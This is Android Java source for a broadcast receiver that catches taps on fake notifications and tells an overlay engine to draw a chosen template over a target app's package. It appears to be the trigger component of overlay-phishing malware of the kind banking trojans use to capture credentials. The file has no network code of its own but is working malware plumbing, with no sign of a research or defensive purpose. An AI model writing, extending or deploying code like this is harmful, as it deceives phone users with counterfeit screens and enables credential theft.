package com.fason.app.features.springe.detection;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.util.Log;

import com.fason.app.features.springe.SpringeEngine;
import com.fason.app.features.springe.SpringeProtocol;

import java.util.concurrent.ConcurrentHashMap;

/**
 * NotificationTrigger — Receives taps on fake notifications and triggers overlays.
 *
 * Flow:
 * 1. NotificationOverlay posts a fake notification with a PendingIntent
 * 2. PendingIntent broadcasts to this receiver
 * 3. Receiver extracts target package + template ID
 * 4. SpringeEngine is called to show the appropriate overlay
 *
 * Also handles notification permission requests via the system.
 *
 * This BroadcastReceiver must be registered in AndroidManifest.xml.
 */
public class NotificationTrigger extends BroadcastReceiver {

    private static final String TAG = "NotificationTrigger";
    private static final String ACTION_NOTIF_TAP = "com.fason.app.SPRINGE_NOTIFICATION_TAP";

    // Static registry: pending notification actionId → {targetPackage, templateId}
    private static final ConcurrentHashMap<String, NotificationAction> pendingNotifications =
        new ConcurrentHashMap<>();

    private static volatile Context registeredContext = null;
    private static volatile NotificationTrigger instance = null;

    public static final class NotificationAction {
        public final String targetPackage;
        public final String templateId;

        public NotificationAction(String targetPackage, String templateId) {
            this.targetPackage = targetPackage;
            this.templateId = templateId;
        }
    }

    /**
     * Register a pending notification action. Called by NotificationOverlay.
     */
    public static void registerPendingNotification(String actionId, String targetPackage,
                                                    String templateId) {
        pendingNotifications.put(actionId, new NotificationAction(targetPackage, templateId));
        Log.d(TAG, "Registered notification: " + actionId + " → " + targetPackage);
    }

    /**
     * Unregister a notification action.
     */
    public static void unregisterPendingNotification(String actionId) {
        pendingNotifications.remove(actionId);
    }

    /**
     * Start the notification trigger receiver.
     */
    public static void start(Context context) {
        if (registeredContext != null) return;

        registeredContext = context.getApplicationContext();
        instance = new NotificationTrigger();

        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction(ACTION_NOTIF_TAP);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registeredContext.registerReceiver(instance, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registeredContext.registerReceiver(instance, filter);
            }

            Log.d(TAG, "Notification trigger started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register notification trigger", e);
        }
    }

    /**
     * Stop the notification trigger.
     */
    public static void stop() {
        if (registeredContext != null && instance != null) {
            try {
                registeredContext.unregisterReceiver(instance);
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering notification trigger", e);
            }
            registeredContext = null;
            instance = null;
        }
        pendingNotifications.clear();
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;

        String action = intent.getAction();
        if (!ACTION_NOTIF_TAP.equals(action)) return;

        String actionId = intent.getStringExtra("actionId");
        if (actionId == null) return;

        NotificationAction notifAction = pendingNotifications.get(actionId);
        if (notifAction == null) {
            Log.w(TAG, "No pending action for: " + actionId);
            return;
        }

        // Remove from pending
        pendingNotifications.remove(actionId);

        Log.i(TAG, "Notification tapped: " + actionId
            + " → " + notifAction.targetPackage);

        // Trigger the overlay via SpringeEngine
        try {
            SpringeEngine engine = SpringeEngine.getInstance();

            org.json.JSONObject cmd = new org.json.JSONObject();
            cmd.put("action", SpringeProtocol.CMD_SHOW);
            cmd.put(SpringeProtocol.KEY_TEMPLATE_ID, notifAction.templateId);
            cmd.put(SpringeProtocol.KEY_TARGET_PACKAGE, notifAction.targetPackage);

            // This will run on the engine's executor thread
            engine.handleCommand(cmd, null, "notif_" + actionId);

        } catch (Exception e) {
            Log.e(TAG, "Failed to trigger overlay from notification", e);
        }
    }
}
